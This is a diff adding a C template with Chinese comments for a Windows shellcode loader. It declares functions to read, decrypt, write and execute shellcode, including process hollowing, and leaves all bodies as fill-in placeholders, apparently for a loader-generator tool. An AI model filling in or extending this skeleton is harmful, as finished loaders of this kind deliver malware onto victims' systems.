@@ -1,0 +1,66 @@
+#include <windows.h>
+#include <stdio.h>
+#include <psapi.h>
+#include <tlhelp32.h>
+#include <winternl.h>
+#include <time.h>
+#include <stdlib.h>
+#pragma comment(lib, "ntdll.lib")  // 用于NtQueryInformationProcess等函数
+
+#define STATUS_SUCCESS ((NTSTATUS)0x00000000)
+
+// ===============================
+// 函数声明
+// ===============================
+
+// 环境准备函数
+BOOL InitializeEnvironment();
+
+// Shellcode IO函数
+PBYTE ReadShellcodeFromFile(LPCWSTR filePath, PDWORD pSize);
+BOOL DecryptShellcodeInMemory(PBYTE shellcode, DWORD size);
+PBYTE WriteShellcodeToMemory(PBYTE shellcode, DWORD size);
+BOOL LoadShellcode(LPCWSTR filePath, PBYTE* pShellcode, PDWORD pSize);
+
+// 执行函数
+BOOL PreExecutionChecks();
+void PostExecutionCleanup(PBYTE shellcode, LPVOID execMem);
+BOOL ExecuteShellcode(PBYTE shellcode, DWORD size);
+
+// 加载方式函数
+void ExecuteLoader(PBYTE shellcode, SIZE_T shellcodeSize);
+void ExecuteProcessHollowing(PBYTE shellcode, SIZE_T shellcodeSize);
+
+{{ debug_macro }}
+{{ api_mapping }}  // 动态函数映射（可选）
+{{ key_code }}     // 解密密钥（可选）
+
+// ===============================
+// 第一步：运行环境准备
+// ===============================
+{{ environment_setup_code }}
+
+// ===============================
+// 第二步：Shellcode读取和写入
+// ===============================
+{{ shellcode_io_code }}
+
+// ===============================
+// 第三步：Shellcode执行
+// ===============================
+{{ shellcode_execution_code }}
+
+// ===============================
+// 加载方式实现
+// ===============================
+{{ load_method_code }}
+
+// ===============================
+// 进程空洞注入实现（如果需要）
+// ===============================
+{{ process_hollowing_code }}
+
+// ===============================
+// 主函数
+// ===============================
+{{ main_code }}
